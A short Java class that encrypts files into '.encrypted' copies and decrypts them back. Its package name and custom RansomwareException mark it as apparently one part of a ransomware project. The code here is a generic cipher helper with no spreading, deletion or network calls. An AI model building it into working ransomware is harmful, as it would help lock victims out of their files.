package Agent.EncryptionAlgo;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import server.exceptions.RansomwareException;

public class JavaCryptoUtil {

	public void doCrypto(SecretKey skey, File inputFile, int cipherMode, File outputFile, String algorithm)
			throws RansomwareException {
		try {
			SecretKey secretKey = new SecretKeySpec(skey.getEncoded(), algorithm);
			Cipher cipher = Cipher.getInstance(algorithm);
			cipher.init(cipherMode, secretKey);
			FileInputStream inputStream = new FileInputStream(inputFile);
			byte[] inputBytes = new byte[(int) inputFile.length()];
			inputStream.read(inputBytes);
			byte[] outputBytes = cipher.doFinal(inputBytes);
			FileOutputStream outputStream = new FileOutputStream(outputFile);
			outputStream.write(outputBytes);

			inputStream.close();
			outputStream.close();

		} catch (Exception e) {
			throw new RansomwareException();
		}

	}

	public void decrypt(SecretKey skey, File fileToDecrypt, String algoritm) throws RansomwareException {
		doCrypto(skey, fileToDecrypt, Cipher.DECRYPT_MODE,
				new File(fileToDecrypt.getAbsolutePath().replaceAll(".encrypted", "")), algoritm);

	}

	public void encrypt(SecretKey skey, File fileToEncrypt, String algoritm) throws RansomwareException {

		doCrypto(skey, fileToEncrypt, Cipher.ENCRYPT_MODE, new File(fileToEncrypt.getAbsolutePath() + ".encrypted"),
				algoritm);
	}



}